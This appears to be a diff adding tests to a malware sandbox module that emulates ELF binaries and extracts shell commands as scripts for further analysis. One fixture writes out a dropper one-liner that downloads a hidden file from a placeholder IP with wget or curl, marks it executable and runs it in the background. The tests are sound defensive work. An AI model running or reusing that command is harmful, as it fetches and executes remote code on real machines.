@@ -228,3 +228,33 @@ def test_manifest_accepts_elf32_and_elf64_only():
         assert re.fullmatch(accepts, ok)
     for no in ("executable/windows/pe64", "executable/linux/elf", "code/shell", "executable/linux/elf128"):
         assert not re.fullmatch(accepts, no)
+
+
+
+# ---- shell commands become extracted scripts ---------------------------------------------
+def _scripts(events, tmp_path, monkeypatch):
+    monkeypatch.setattr(ElfSim, "working_directory", property(lambda self: str(tmp_path)))
+    got = []
+
+    class Req:
+        def add_extracted(self, path, name, desc, **kw):
+            got.append((name, open(path).read(), kw.get("parent_relation")))
+            return True
+    ElfSim()._scripts(Req(), SimpleNamespace(events=events))
+    return got
+
+
+def _exec(*argv):
+    return {"kind": "process", "syscall": "execve", "path": argv[0], "argv": list(argv)}
+
+
+def test_sh_dash_c_commands_are_extracted_as_scripts_for_bashsim_and_payloadfetcher(tmp_path, monkeypatch):
+    cmd = "cd /tmp && (wget -q -O /tmp/.x 'http://198.51.100.7/a' || curl -ks -o /tmp/.x 'http://198.51.100.7/a') && chmod +x /tmp/.x && /tmp/.x &"
+    (name, body, relation), = _scripts([_exec("/bin/sh", "-c", cmd), _exec("/bin/sh", "-c", cmd)], tmp_path, monkeypatch)
+    assert name == "emulated_command_0.sh" and body == "#!/bin/sh\n" + cmd + "\n"     # deduplicated
+    assert str(relation).endswith("DYNAMIC")
+
+
+def test_non_shell_execs_and_plain_shell_starts_are_not_extracted(tmp_path, monkeypatch):
+    events = [_exec("/usr/bin/wget", "-O", "x", "http://198.51.100.7/"), _exec("/bin/sh"), _exec("sh", "-c")]
+    assert _scripts(events, tmp_path, monkeypatch) == []
